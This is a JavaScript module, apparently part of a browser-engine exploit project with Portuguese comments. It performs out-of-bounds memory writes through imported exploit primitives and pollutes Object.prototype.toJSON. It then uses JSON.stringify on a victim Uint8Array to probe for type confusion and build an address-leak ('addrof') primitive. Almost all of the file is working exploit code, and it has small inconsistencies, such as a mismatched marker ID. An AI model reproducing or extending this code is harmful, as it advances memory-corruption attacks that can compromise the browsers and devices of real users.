// js/script3/testArrayBufferVictimCrash.mjs (v80_ReturnPrimitiveFromGetter)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_write_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V80_RPFG = "OriginalHeisenbug_TypedArrayAddrof_v80_ReturnPrimitiveFromGetter";

const VICTIM_BUFFER_SIZE = 256;
const LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET = 0x7C;
// OOB_WRITE_VALUE será iterado
const OOB_WRITE_VALUES_V80 = [0xFFFFFFFF, 0x7FFFFFFF]; 

let object_to_leak_A_v80 = null; // Ainda definido para o getter tentar usá-lo
let object_to_leak_B_v80 = null; // Ainda definido para a propriedade direta
let victim_typed_array_ref_v80 = null; 
let probe_call_count_v80 = 0;
let marker_M1_ref_v80 = null; 
let marker_M2_ref_v80 = null; 
// Armazena os detalhes da Call #2, quando M2 é 'this' e é (esperançosamente) confuso.
let details_of_M2_as_this_call_v80 = null; 
const PROBE_CALL_LIMIT_V80 = 7; // Limite um pouco maior para capturar mais interações se houver


function toJSON_TA_Probe_ReturnPrimitiveFromGetter() {
    probe_call_count_v80++;
    const call_num = probe_call_count_v80;
    let current_call_log_info = { 
        call_number: call_num,
        probe_variant: "TA_Probe_V80_ReturnPrimitiveFromGetter",
        this_type: Object.prototype.toString.call(this),
        this_is_victim: (this === victim_typed_array_ref_v80),
        this_is_M1: (this === marker_M1_ref_v80 && marker_M1_ref_v80 !== null),
        this_is_M2: (this === marker_M2_ref_v80 && marker_M2_ref_v80 !== null),
        m2_interaction_summary: null, 
        error_in_probe: null
    };
    logS3(`[PROBE_V80] Call #${call_num}. 'this': ${current_call_log_info.this_type}. IsVictim? ${current_call_log_info.this_is_victim}. IsM1? ${current_call_log_info.this_is_M1}. IsM2? ${current_call_log_info.this_is_M2}`, "leak");

    // Atualizar details_of_M2_as_this_call_v80 SE esta chamada for a que interage com M2 como 'this'.
    // Ou, se for uma chamada posterior, para garantir que temos os detalhes da última.
    if (current_call_log_info.this_is_M2 || !details_of_M2_as_this_call_v80 || call_num > details_of_M2_as_this_call_v80.call_number) {
        details_of_M2_as_this_call_v80 = current_call_log_info;
    }
    
    try {
        if (call_num > PROBE_CALL_LIMIT_V80) {
            logS3(`[PROBE_V80] Call #${call_num}: Probe limit. Stop.`, "warn");
            return { recursion_stopped_v80: true };
        }

        if (call_num === 1 && current_call_log_info.this_is_victim) {
            logS3(`[PROBE_V80] Call #${call_num}: 'this' is victim. Returning M1 (contains M2).`, "info");
            marker_M2_ref_v80 = { marker_id_v80: "M2_V80_Target" }; // M2 é criado aqui
            marker_M1_ref_v80 = { marker_id_v80: "M1_V80_Container", payload_M2: marker_M2_ref_v80 };
            return marker_M1_ref_v80;
        } else if (current_call_log_info.this_is_M2) { // Verifica se 'this' é o M2 que criamos
            logS3(`[PROBE_V80] Call #${call_num}: 'this' IS M2. Current type: ${current_call_log_info.this_type}. Checking for TC...`, "critical");
            current_call_log_info.m2_interaction_summary = {
                getter_defined: false, direct_prop_set: false, primitive_prop_set: false, keys_after: "N/A"
            };
            if (current_call_log_info.this_type === '[object Object]') { 
                logS3(`[PROBE_V80] Call #${call_num}: TYPE CONFUSION ON M2 ('this')! Defining getter & props...`, "vuln");
                
                Object.defineProperty(this, 'leaky_A_getter_v80', {
                    get: function() {
                        logS3(`[PROBE_V80] !!! Getter 'leaky_A_getter_v80' on confused M2 (call #${call_num}) FIRED !!! Returning placeholder primitive.`, "vuln");
                        return 1337.7331; // Retornar um primitivo
                    }, enumerable: true, configurable: true
                });
                current_call_log_info.m2_interaction_summary.getter_defined = true;
                
                this.leaky_B_direct_v80 = object_to_leak_B_v80; // Ainda atribuir o objeto para ver como é serializado
                current_call_log_info.m2_interaction_summary.direct_prop_set = true;

                this.leaky_C_primitive_v80 = 0x42424242;
                current_call_log_info.m2_interaction_summary.primitive_prop_set = true;

                try{ current_call_log_info.m2_interaction_summary.keys_after = Object.keys(this).join(','); } catch(e){}
                logS3(`[PROBE_V80] Call #${call_num}: Getter and props set on M2 ('this'). Keys: ${current_call_log_info.m2_interaction_summary.keys_after}`, "info");
            } else {
                 logS3(`[PROBE_V80] Call #${call_num}: M2 ('this') was NOT [object Object]. Type: ${current_call_log_info.this_type}`, "warn");
            }
            return this; // Retorna M2 (potencialmente modificado)
        }
    } catch (e) {
        current_call_log_info.error_in_probe = e.message;
        logS3(`[PROBE_V80] Call #${call_num}: ERROR in probe: ${e.name} - ${e.message}`, "error");
    }
    
    return { generic_marker_v80: call_num }; 
}


export async function executeTypedArrayVictimAddrofTest_ReturnPrimitiveFromGetter() {
    const FNAME_CURRENT_TEST_BASE = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V80_RPFG}`;
    logS3(`--- Initiating ${FNAME_CURRENT_TEST_BASE}: Heisenbug (ReturnPrimitiveFromGetter) & Addrof ---`, "test", FNAME_CURRENT_TEST_BASE);
    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V80_RPFG} Init...`;

    let overall_results = [];

    for (const current_oob_value of OOB_WRITE_VALUES_V80) {
        const FNAME_CURRENT_ITERATION = `${FNAME_CURRENT_TEST_BASE}_Val${toHex(current_oob_value)}`;
        logS3(`\n===== ITERATION: OOB Write Value: ${toHex(current_oob_value)} =====`, "subtest", FNAME_CURRENT_ITERATION);

        probe_call_count_v80 = 0;
        victim_typed_array_ref_v80 = null; 
        marker_M1_ref_v80 = null;
        marker_M2_ref_v80 = null;
        details_of_M2_as_this_call_v80 = null; // Reset para cada iteração
        object_to_leak_A_v80 = { marker_A_v80: `LeakA_Val${toHex(current_oob_value)}`}; 
        object_to_leak_B_v80 = { marker_B_v80: `LeakB_Val${toHex(current_oob_value)}`};

        let iterError = null;
        let stringifyOutput_parsed = null; 
        
        let addrof_M2_Getter = { success: false, msg: "M2.leaky_A_getter: Default"};
        let addrof_M2_Direct = { success: false, msg: "M2.leaky_B_direct: Default"};
        let addrof_M2_Primitive = { success: false, msg: "M2.leaky_C_primitive: Default"};


        try {
            await triggerOOB_primitive({ force_reinit: true });
            oob_write_absolute(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET, current_oob_value, 4);
            logS3(`  OOB Write: offset ${toHex(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET)}, value ${toHex(current_oob_value)} done.`, "info", FNAME_CURRENT_ITERATION);
            await PAUSE_S3(100);

            victim_typed_array_ref_v80 = new Uint8Array(new ArrayBuffer(VICTIM_BUFFER_SIZE)); 
            logS3(`STEP 2: victim_typed_array_ref_v80 (Uint8Array) created.`, "test", FNAME_CURRENT_ITERATION);
            
            const ppKey = 'toJSON';
            let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
            let pollutionApplied = false;

            try {
                Object.defineProperty(Object.prototype, ppKey, { value: toJSON_TA_Probe_ReturnPrimitiveFromGetter, writable: true, configurable: true, enumerable: false });
                pollutionApplied = true;
                let rawStringifyOutput = JSON.stringify(victim_typed_array_ref_v80); 
                logS3(`  JSON.stringify completed for iter Val${toHex(current_oob_value)}. Raw Output: ${rawStringifyOutput}`, "info", FNAME_CURRENT_ITERATION);
                try {
                    stringifyOutput_parsed = JSON.parse(rawStringifyOutput); 
                } catch (e_parse) {
                    stringifyOutput_parsed = { error_parsing_stringify_output: rawStringifyOutput, parse_error: e_parse.message };
                }
                
                // details_of_M2_as_this_call_v80 é a cópia do current_call_details da chamada onde M2 foi 'this'
                logS3(`  EXECUTE: Details of M2 interaction (if occurred): ${details_of_M2_as_this_call_v80 ? JSON.stringify(details_of_M2_as_this_call_v80) : 'N/A'}`, "leak", FNAME_CURRENT_ITERATION);

                let heisenbugOnM2 = false;
                if (details_of_M2_as_this_call_v80 && 
                    details_of_M2_as_this_call_v80.this_is_M2 &&
                    details_of_M2_as_this_call_v80.this_type === "[object Object]") {
                    heisenbugOnM2 = true;
                }
                logS3(`  EXECUTE: Heisenbug on M2 Target ${heisenbugOnM2 ? "CONFIRMED" : "NOT Confirmed"}.`, heisenbugOnM2 ? "vuln" : "error", FNAME_CURRENT_ITERATION);
                    
                logS3("STEP 3: Checking stringifyOutput_parsed (M1 containing M2) for leaked properties...", "warn", FNAME_CURRENT_ITERATION);
                let m2_payload_from_stringify = null;
                if (stringifyOutput_parsed && stringifyOutput_parsed.marker_id_v80 === "M1_V79_Container" && stringifyOutput_parsed.payload_M2) { // Note: ID de M1 da v79
                    m2_payload_from_stringify = stringifyOutput_parsed.payload_M2; 
                    logS3("   stringifyOutput_parsed seems to be M1 containing M2. Checking M2 (payload_M2).", "info");
                } else {
                    logS3(`   stringifyOutput_parsed was not M1 containing M2 as expected. Content: ${JSON.stringify(stringifyOutput_parsed)}`, "warn", FNAME_CURRENT_ITERATION);
                }

                if (m2_payload_from_stringify && m2_payload_from_stringify.marker_id_v80 === "M2_V80_Target") {
                    const val_getter = m2_payload_from_stringify.leaky_A_getter_v80; 
                    if (val_getter === 1337.7331) {
                       addrof_M2_Getter.success = true; addrof_M2_Getter.msg = `Getter returned placeholder primitive correctly: ${val_getter}`;
                    } else { addrof_M2_Getter.msg = `Getter value unexpected. Val: ${JSON.stringify(val_getter)}`; }

                    const val_direct = m2_payload_from_stringify.leaky_B_direct_v80;
                    if (val_direct && val_direct.marker_B_v80 === object_to_leak_B_v80.marker_B_v80) { // Checa identidade
                         addrof_M2_Direct.success = true; addrof_M2_Direct.msg = "object_to_leak_B_v80 identity from direct prop.";
                    } else { addrof_M2_Direct.msg = `Direct prop val not objB identity. Val: ${JSON.stringify(val_direct)}`; }
                    
                    const val_primitive = m2_payload_from_stringify.leaky_C_primitive_v80;
                    if (val_primitive === 0x42424242) {
                         addrof_M2_Primitive.success = true; addrof_M2_Primitive.msg = `Primitive 0x42424242 found.`;
                    } else { addrof_M2_Primitive.msg = `Primitive C not found or wrong val. Val: ${JSON.stringify(val_primitive)}`; }

                } else {
                    addrof_M2_Getter.msg = "Target M2 not found in stringifyOutput_parsed as expected.";
                    addrof_M2_Direct.msg = "Target M2 not found in stringifyOutput_parsed as expected.";
                    addrof_M2_Primitive.msg = "Target M2 not found in stringifyOutput_parsed as expected.";
                }

            } catch (e_str) { iterError = e_str;
            } finally { if (pollutionApplied) Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor || { value: null, writable: true, configurable: true, enumerable: false }); }
        } catch (e_outer) { iterError = e_outer;
        } finally { clearOOBEnvironment({force_clear_even_if_not_setup: true}); }
        
        overall_results.push({
            oob_value: toHex(current_oob_value), error: iterError ? `${iterError.name}: ${iterError.message}` : null,
            details_M2_call: details_of_M2_as_this_call_v80 ? JSON.parse(JSON.stringify(details_of_M2_as_this_call_v80)) : null, 
            final_stringify_output_parsed_iter: stringifyOutput_parsed,
            addrof_M2_Getter: {...addrof_M2_Getter}, addrof_M2_Direct: {...addrof_M2_Direct}, addrof_M2_Primitive: {...addrof_M2_Primitive},
            probe_calls_this_iter: probe_call_count_v80 
        });
        if (addrof_M2_Getter.success || addrof_M2_Direct.success || addrof_M2_Primitive.success) {
            logS3(`!!!! POTENTIAL LEAK SUCCESS for OOB Value ${toHex(current_oob_value)} !!!!`, "vuln", FNAME_CURRENT_ITERATION);
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V80_RPFG}: Leak? ${toHex(current_oob_value)} SUCCESS!`;
        }
        await PAUSE_S3(100); 
    } // Fim do loop OOB_WRITE_VALUES_V80

    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Completed All Iterations ---`, "test", FNAME_CURRENT_TEST_BASE);
    // ... (logging resumido de overall_results)
    if (!document.title.includes("SUCCESS")) document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V80_RPFG}: All Vals Tested.`;
    
    let result_for_runner = overall_results.find(r => r.addrof_M2_Getter.success || r.addrof_M2_Direct.success || r.addrof_M2_Primitive.success);
    if (!result_for_runner && overall_results.length > 0) result_for_runner = overall_results[overall_results.length - 1];

    return { 
        iteration_results_summary: overall_results.map(r => ({ /* ... */ })),
        toJSON_details: result_for_runner ? result_for_runner.details_M2_call : null, 
        stringifyResult: result_for_runner ? result_for_runner.final_stringify_output_parsed_iter : null,
        addrof_A_result: result_for_runner ? result_for_runner.addrof_M2_Getter : addrof_M2_Getter, 
        addrof_B_result: result_for_runner ? result_for_runner.addrof_M2_Direct : addrof_M2_Direct,
        addrof_C_result: result_for_runner ? result_for_runner.addrof_M2_Primitive : addrof_M2_Primitive, // Novo resultado
        total_probe_calls: result_for_runner ? result_for_runner.probe_calls_this_iter : 0 
    };
}
